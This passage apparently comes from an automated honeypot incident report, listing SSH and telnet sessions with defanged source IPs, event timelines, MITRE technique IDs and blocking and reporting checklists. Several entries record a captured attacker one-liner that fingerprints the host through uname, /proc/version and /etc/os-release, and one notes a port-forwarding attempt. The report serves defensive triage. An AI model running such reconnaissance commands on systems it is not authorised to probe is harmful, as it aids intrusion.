| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:03:38` | `cowrie.session.connect` |
| `2026-07-06 04:03:39` | `cowrie.client.version` |
| `2026-07-06 04:03:39` | `cowrie.client.kex` |
| `2026-07-06 04:03:42` | `cowrie.login.success` |
| `2026-07-06 04:03:43` | `cowrie.session.params` |
| `2026-07-06 04:03:43` | `cowrie.command.input` |
| `2026-07-06 04:03:43` | `cowrie.command.input` |
| `2026-07-06 04:03:43` | `cowrie.command.input` |
| `2026-07-06 04:03:43` | `cowrie.command.input` |
| `2026-07-06 04:03:43` | `cowrie.command.input` |
| `2026-07-06 04:03:43` | `cowrie.command.success` |
| `2026-07-06 04:03:43` | `cowrie.command.input` |
| `2026-07-06 04:03:43` | `cowrie.command.input` |
| `2026-07-06 04:03:43` | `cowrie.command.input` |
| `2026-07-06 04:03:43` | `cowrie.command.input` |
| `2026-07-06 04:03:44` | `cowrie.log.closed` |
| `2026-07-06 04:03:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-138994da9e67

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 04:04 |
| **Last Seen** | 2026-07-06 04:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:04:22` | `cowrie.session.connect` |
| `2026-07-06 04:04:22` | `cowrie.client.version` |
| `2026-07-06 04:04:22` | `cowrie.client.kex` |
| `2026-07-06 04:04:22` | `cowrie.login.success` |
| `2026-07-06 04:04:23` | `cowrie.direct-tcpip.request` |
| `2026-07-06 04:04:23` | `cowrie.direct-tcpip.data` |
| `2026-07-06 04:04:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36c93914aa36

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:04 |
| **Last Seen** | 2026-07-06 04:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:04:35` | `cowrie.session.connect` |
| `2026-07-06 04:04:35` | `cowrie.client.version` |
| `2026-07-06 04:04:35` | `cowrie.client.kex` |
| `2026-07-06 04:04:38` | `cowrie.login.success` |
| `2026-07-06 04:04:39` | `cowrie.session.params` |
| `2026-07-06 04:04:39` | `cowrie.command.input` |
| `2026-07-06 04:04:39` | `cowrie.command.input` |
| `2026-07-06 04:04:39` | `cowrie.command.input` |
| `2026-07-06 04:04:39` | `cowrie.command.input` |
| `2026-07-06 04:04:39` | `cowrie.command.input` |
| `2026-07-06 04:04:39` | `cowrie.command.success` |
| `2026-07-06 04:04:39` | `cowrie.command.input` |
| `2026-07-06 04:04:39` | `cowrie.command.input` |
| `2026-07-06 04:04:39` | `cowrie.command.input` |
| `2026-07-06 04:04:39` | `cowrie.command.input` |
| `2026-07-06 04:04:40` | `cowrie.log.closed` |
| `2026-07-06 04:04:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a6764d4628e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 04:04 |
| **Last Seen** | 2026-07-06 04:04 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:04:45` | `cowrie.session.connect` |
| `2026-07-06 04:04:47` | `cowrie.client.version` |
| `2026-07-06 04:04:47` | `cowrie.client.kex` |
| `2026-07-06 04:04:53` | `cowrie.login.success` |
| `2026-07-06 04:04:57` | `cowrie.session.params` |
| `2026-07-06 04:04:57` | `cowrie.command.input` |
| `2026-07-06 04:04:59` | `cowrie.log.closed` |
| `2026-07-06 04:04:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c275c13b769c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:05 |
| **Last Seen** | 2026-07-06 04:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:05:30` | `cowrie.session.connect` |
| `2026-07-06 04:05:30` | `cowrie.client.version` |
| `2026-07-06 04:05:30` | `cowrie.client.kex` |
| `2026-07-06 04:05:32` | `cowrie.login.success` |
| `2026-07-06 04:05:34` | `cowrie.session.params` |
| `2026-07-06 04:05:34` | `cowrie.command.input` |
| `2026-07-06 04:05:34` | `cowrie.command.input` |
| `2026-07-06 04:05:34` | `cowrie.command.input` |
| `2026-07-06 04:05:34` | `cowrie.command.input` |
| `2026-07-06 04:05:34` | `cowrie.command.input` |
| `2026-07-06 04:05:34` | `cowrie.command.success` |
| `2026-07-06 04:05:34` | `cowrie.command.input` |
| `2026-07-06 04:05:34` | `cowrie.command.input` |
| `2026-07-06 04:05:34` | `cowrie.command.input` |
| `2026-07-06 04:05:34` | `cowrie.command.input` |
| `2026-07-06 04:05:35` | `cowrie.log.closed` |
| `2026-07-06 04:05:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b90d4bcb7204

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:06 |
| **Last Seen** | 2026-07-06 04:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:06:26` | `cowrie.session.connect` |
| `2026-07-06 04:06:26` | `cowrie.client.version` |
| `2026-07-06 04:06:26` | `cowrie.client.kex` |
| `2026-07-06 04:06:29` | `cowrie.login.success` |
| `2026-07-06 04:06:31` | `cowrie.session.params` |
| `2026-07-06 04:06:31` | `cowrie.command.input` |
| `2026-07-06 04:06:31` | `cowrie.command.input` |
| `2026-07-06 04:06:31` | `cowrie.command.input` |
| `2026-07-06 04:06:31` | `cowrie.command.input` |
| `2026-07-06 04:06:31` | `cowrie.command.input` |
| `2026-07-06 04:06:31` | `cowrie.command.success` |
| `2026-07-06 04:06:31` | `cowrie.command.input` |
| `2026-07-06 04:06:31` | `cowrie.command.input` |
| `2026-07-06 04:06:31` | `cowrie.command.input` |
| `2026-07-06 04:06:31` | `cowrie.command.input` |
| `2026-07-06 04:06:31` | `cowrie.log.closed` |
| `2026-07-06 04:06:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc5c3fa5a864

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:07 |
| **Last Seen** | 2026-07-06 04:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:07:21` | `cowrie.session.connect` |
| `2026-07-06 04:07:22` | `cowrie.client.version` |
| `2026-07-06 04:07:22` | `cowrie.client.kex` |
| `2026-07-06 04:07:24` | `cowrie.login.success` |
| `2026-07-06 04:07:26` | `cowrie.session.params` |
| `2026-07-06 04:07:26` | `cowrie.command.input` |
| `2026-07-06 04:07:26` | `cowrie.command.input` |
| `2026-07-06 04:07:26` | `cowrie.command.input` |
| `2026-07-06 04:07:26` | `cowrie.command.input` |
| `2026-07-06 04:07:26` | `cowrie.command.input` |
| `2026-07-06 04:07:26` | `cowrie.command.success` |
| `2026-07-06 04:07:26` | `cowrie.command.input` |
| `2026-07-06 04:07:26` | `cowrie.command.input` |
| `2026-07-06 04:07:26` | `cowrie.command.input` |
| `2026-07-06 04:07:26` | `cowrie.command.input` |
| `2026-07-06 04:07:27` | `cowrie.log.closed` |
| `2026-07-06 04:07:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-674b6f574c5f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:08 |
| **Last Seen** | 2026-07-06 04:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:08:16` | `cowrie.session.connect` |
| `2026-07-06 04:08:17` | `cowrie.client.version` |
| `2026-07-06 04:08:17` | `cowrie.client.kex` |
| `2026-07-06 04:08:19` | `cowrie.login.success` |
| `2026-07-06 04:08:21` | `cowrie.session.params` |
| `2026-07-06 04:08:21` | `cowrie.command.input` |
| `2026-07-06 04:08:21` | `cowrie.command.input` |
| `2026-07-06 04:08:21` | `cowrie.command.input` |
| `2026-07-06 04:08:21` | `cowrie.command.input` |
| `2026-07-06 04:08:21` | `cowrie.command.input` |
| `2026-07-06 04:08:21` | `cowrie.command.success` |
| `2026-07-06 04:08:21` | `cowrie.command.input` |
| `2026-07-06 04:08:21` | `cowrie.command.input` |
| `2026-07-06 04:08:21` | `cowrie.command.input` |
| `2026-07-06 04:08:21` | `cowrie.command.input` |
| `2026-07-06 04:08:21` | `cowrie.log.closed` |
| `2026-07-06 04:08:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9d926668ad9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:09 |
| **Last Seen** | 2026-07-06 04:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:09:10` | `cowrie.session.connect` |
| `2026-07-06 04:09:10` | `cowrie.client.version` |
| `2026-07-06 04:09:10` | `cowrie.client.kex` |
| `2026-07-06 04:09:12` | `cowrie.login.success` |
| `2026-07-06 04:09:14` | `cowrie.session.params` |
| `2026-07-06 04:09:14` | `cowrie.command.input` |
| `2026-07-06 04:09:14` | `cowrie.command.input` |
| `2026-07-06 04:09:14` | `cowrie.command.input` |
| `2026-07-06 04:09:14` | `cowrie.command.input` |
| `2026-07-06 04:09:14` | `cowrie.command.input` |
| `2026-07-06 04:09:14` | `cowrie.command.success` |
| `2026-07-06 04:09:14` | `cowrie.command.input` |
| `2026-07-06 04:09:14` | `cowrie.command.input` |
| `2026-07-06 04:09:14` | `cowrie.command.input` |
| `2026-07-06 04:09:14` | `cowrie.command.input` |
| `2026-07-06 04:09:14` | `cowrie.log.closed` |
| `2026-07-06 04:09:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc13cb6a6a21

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:10 |
| **Last Seen** | 2026-07-06 04:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:10:03` | `cowrie.session.connect` |
| `2026-07-06 04:10:03` | `cowrie.client.version` |
| `2026-07-06 04:10:03` | `cowrie.client.kex` |
| `2026-07-06 04:10:05` | `cowrie.login.success` |
| `2026-07-06 04:10:07` | `cowrie.session.params` |
| `2026-07-06 04:10:07` | `cowrie.command.input` |
| `2026-07-06 04:10:07` | `cowrie.command.input` |
| `2026-07-06 04:10:07` | `cowrie.command.input` |
| `2026-07-06 04:10:07` | `cowrie.command.input` |
| `2026-07-06 04:10:07` | `cowrie.command.input` |
| `2026-07-06 04:10:07` | `cowrie.command.success` |
| `2026-07-06 04:10:07` | `cowrie.command.input` |
| `2026-07-06 04:10:07` | `cowrie.command.input` |
| `2026-07-06 04:10:07` | `cowrie.command.input` |
| `2026-07-06 04:10:07` | `cowrie.command.input` |
| `2026-07-06 04:10:08` | `cowrie.log.closed` |
| `2026-07-06 04:10:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21f14ed1c40c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:10 |
| **Last Seen** | 2026-07-06 04:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:10:56` | `cowrie.session.connect` |
| `2026-07-06 04:10:57` | `cowrie.client.version` |
| `2026-07-06 04:10:57` | `cowrie.client.kex` |
| `2026-07-06 04:10:59` | `cowrie.login.success` |
| `2026-07-06 04:11:01` | `cowrie.session.params` |
| `2026-07-06 04:11:01` | `cowrie.command.input` |
| `2026-07-06 04:11:01` | `cowrie.command.input` |
| `2026-07-06 04:11:01` | `cowrie.command.input` |
| `2026-07-06 04:11:01` | `cowrie.command.input` |
| `2026-07-06 04:11:01` | `cowrie.command.input` |
| `2026-07-06 04:11:01` | `cowrie.command.success` |
| `2026-07-06 04:11:01` | `cowrie.command.input` |
| `2026-07-06 04:11:01` | `cowrie.command.input` |
| `2026-07-06 04:11:01` | `cowrie.command.input` |
| `2026-07-06 04:11:01` | `cowrie.command.input` |
| `2026-07-06 04:11:02` | `cowrie.log.closed` |
| `2026-07-06 04:11:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c26197f6344

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:11 |
| **Last Seen** | 2026-07-06 04:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:11:49` | `cowrie.session.connect` |
| `2026-07-06 04:11:49` | `cowrie.client.version` |
| `2026-07-06 04:11:49` | `cowrie.client.kex` |
| `2026-07-06 04:11:52` | `cowrie.login.success` |
| `2026-07-06 04:11:54` | `cowrie.session.params` |
| `2026-07-06 04:11:54` | `cowrie.command.input` |
| `2026-07-06 04:11:54` | `cowrie.command.input` |
| `2026-07-06 04:11:54` | `cowrie.command.input` |
| `2026-07-06 04:11:54` | `cowrie.command.input` |
| `2026-07-06 04:11:54` | `cowrie.command.input` |
| `2026-07-06 04:11:54` | `cowrie.command.success` |
| `2026-07-06 04:11:54` | `cowrie.command.input` |
| `2026-07-06 04:11:54` | `cowrie.command.input` |
| `2026-07-06 04:11:54` | `cowrie.command.input` |
| `2026-07-06 04:11:54` | `cowrie.command.input` |
| `2026-07-06 04:11:54` | `cowrie.log.closed` |
| `2026-07-06 04:11:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d906e890fcf

| Field | Detail |
|---|---|
| **Source IP** | `147.139.136[.]75` |
| **First Seen** | 2026-07-06 04:11 |
| **Last Seen** | 2026-07-06 04:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:11:54` | `cowrie.session.connect` |
| `2026-07-06 04:11:54` | `cowrie.telnet.option` |
| `2026-07-06 04:11:55` | `cowrie.telnet.option` |
| `2026-07-06 04:12:55` | `cowrie.login.success` |
| `2026-07-06 04:12:55` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `147.139.136[.]75` to AbuseIPDB if not already reported
- [ ] Block `147.139.136[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6675306a9ebc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:12 |
| **Last Seen** | 2026-07-06 04:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:12:41` | `cowrie.session.connect` |
| `2026-07-06 04:12:42` | `cowrie.client.version` |
| `2026-07-06 04:12:42` | `cowrie.client.kex` |
| `2026-07-06 04:12:45` | `cowrie.login.success` |
| `2026-07-06 04:12:47` | `cowrie.session.params` |
| `2026-07-06 04:12:47` | `cowrie.command.input` |
| `2026-07-06 04:12:47` | `cowrie.command.input` |
| `2026-07-06 04:12:47` | `cowrie.command.input` |
| `2026-07-06 04:12:47` | `cowrie.command.input` |
| `2026-07-06 04:12:47` | `cowrie.command.input` |
| `2026-07-06 04:12:47` | `cowrie.command.success` |
| `2026-07-06 04:12:47` | `cowrie.command.input` |
| `2026-07-06 04:12:47` | `cowrie.command.input` |
| `2026-07-06 04:12:47` | `cowrie.command.input` |
| `2026-07-06 04:12:47` | `cowrie.command.input` |
| `2026-07-06 04:12:47` | `cowrie.log.closed` |
| `2026-07-06 04:12:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6413abb5729e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:13 |
| **Last Seen** | 2026-07-06 04:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
